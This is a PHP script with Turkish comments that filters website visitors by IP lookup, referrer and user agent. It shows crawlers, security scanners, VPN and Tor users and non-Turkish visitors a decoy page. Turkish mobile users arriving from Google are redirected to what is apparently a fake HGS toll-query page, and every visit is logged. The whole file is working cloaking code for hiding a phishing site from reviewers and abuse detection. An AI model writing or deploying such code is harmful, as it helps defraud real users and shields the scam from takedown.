<?php
// Ziyaretçinin IP adresini al
// Cloudflare kullanıyorsanız, 'CF-Connecting-IP' başlığını kullanarak gerçek ziyaretçi IP'sini alın
$ziyaretciip = isset($_SERVER['HTTP_CF_CONNECTING_IP']) ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER['REMOTE_ADDR'];
// cURL ile IP bilgilerini ipinfo.io'dan alma
$ch = curl_init("https://ipinfo.io/{$ziyaretciip}/json?token=83271bac4f04bf");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);
// JSON cevabını PHP dizisine dönüştürme
$ipDetails = json_decode($response, true);
// Ziyaretçi bilgilerini al
$ziyaretcireferer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
$ziyaretciuseragent = strtolower($_SERVER['HTTP_USER_AGENT']);
$ziyaretcitarayicidili = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : '';
$ziyaretcipathbilgisi = $_SERVER['REQUEST_URI'];
// İlk kontrol grubu - izin verilmeyen ziyaretçi
$isDisallowedVisitor = 
    $ipDetails['country'] !== 'TR' ||
    (isset($ipDetails['asn']['type']) && $ipDetails['asn']['type'] !== 'isp') ||
    empty($ipDetails['asn']['type']) ||
    preg_match('/google|llc|amazon|digitalocean|chain|province|network|inap|censys|ireland|turknet|bot|avast|viettel|carinet|googlebot|adsbot|instant|express|bilgi|netinternet/', strtolower($ipDetails['company']['name'])) ||
    (!isset($ipDetails['abuse']['country']) || $ipDetails['abuse']['country'] !== 'TR') ||
    (isset($ipDetails['privacy']['proxy']) && $ipDetails['privacy']['proxy'] === true) ||
    (isset($ipDetails['privacy']['tor']) && $ipDetails['privacy']['tor'] === true) ||
    (isset($ipDetails['privacy']['vpn']) && $ipDetails['privacy']['vpn'] === true) ||
    strpos($ziyaretcipathbilgisi, '/') === false ||
    (empty($ziyaretcireferer) || strpos($ziyaretcireferer, 'https://www.google.com') === false) || // referer kontrolü
    preg_match('/google|googlebot|expanse|x11|adsbot|adwords|ucbrowser|python|webtech|creatives|compatible|mac|zgrab|curl|macintosh|spider|crawler|mediapartners|apac|none|info|yandex|bing|tiktok|twitter|facebook|sql|slurp|duckduckbot|baiduspider|yandexbot|windows|whatsapp|telegram|colly|java|discord/', strtolower($ziyaretciuseragent)) || // user agent kontrolü
    (trim($ziyaretciuseragent) === '' || stripos($ziyaretciuseragent, 'unknown') !== false || stripos($ziyaretciuseragent, 'bilinmiyor') !== false) || // user agent boşsa veya "unknown" veya "bilinmiyor" içeriyorsa
    empty($ziyaretciip) || trim($ziyaretciip) === '' || // ziyaretçi IP boş ise veya boşluk karakteri var ise
    filter_var($ziyaretciip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6); // IPv6 ise
    // Eğer izin verilmeyen ziyaretçi ise YouTube iframe göster ve işlemi bitir
if ($isDisallowedVisitor) {
    include 'proxy.php'; // proxy.php sayfasını doğrudan ekleyin
    echo "<script type='text/javascript'>";
    echo "console.log('IP Adresi:', " . json_encode($ziyaretciip) . ");";
    echo "</script>";
   
    date_default_timezone_set("Europe/Istanbul");
    $current_date_time = date("H:i:s");
    $file_contents = file_get_contents("iploglari.txt");
    $line_count = count(explode("\n", $file_contents));
    $line_number = $line_count + 1;
    $data = "$line_number - {$ziyaretciip} - {$ziyaretciuseragent} - {$ipDetails['country']} - $current_date_time - {$ziyaretcitarayicidili} - BOT GIRISI\n";
    $file = 'iploglari.txt';
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
    exit; // Diğer kontrol bloklarına geçmeden script'i sonlandır
}

// İkinci kontrol grubu - izin verilen ziyaretçi
$isAllowedVisitor = 
    $ipDetails['country'] === 'TR' &&
    isset($ipDetails['asn']['type']) && $ipDetails['asn']['type'] === 'isp' &&
    (!isset($ipDetails['privacy']['vpn']) || $ipDetails['privacy']['vpn'] === false) && // vpn değeri false ise
    (!isset($ipDetails['privacy']['proxy']) || $ipDetails['privacy']['proxy'] === false) && // proxy değeri false ise
    strpos($ziyaretcireferer, 'https://www.google.com/') !== false &&
    strpos($ziyaretcitarayicidili, 'tr') !== false &&
    (strpos($ziyaretciuseragent, 'android') !== false || strpos($ziyaretciuseragent, 'iphone') !== false || strpos($ziyaretciuseragent, 'ios') !== false) &&
    strpos($ziyaretcipathbilgisi, '/') !== false;

// Eğer izin verilen ziyaretçi ise belirtilen içeriği göster
if ($isAllowedVisitor) {
    header('Location: /yuklemeler/hgsUserquery.php');
    
    date_default_timezone_set("Europe/Istanbul");
    $current_date_time = date("H:i:s");
    $file_contents = file_get_contents("iploglari.txt");
    $line_count = count(explode("\n", $file_contents));
    $line_number = $line_count + 1;
    $data = "$line_number - {$ziyaretciip} - {$ziyaretciuseragent} - {$ipDetails['country']} - $current_date_time - {$ziyaretcitarayicidili} - NORMAL GIRIS\n";
    $file = 'iploglari.txt';
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
    exit();
} 

else {
    include 'proxy.php'; // proxy.php sayfasını doğrudan ekleyin
    echo "<script type='text/javascript'>";
    echo "console.log('IP Adresi:', " . json_encode($ziyaretciip) . ");";
    echo "</script>";
    exit; // Diğer kontrol bloklarına geçmeden script'i sonlandır
}
?>
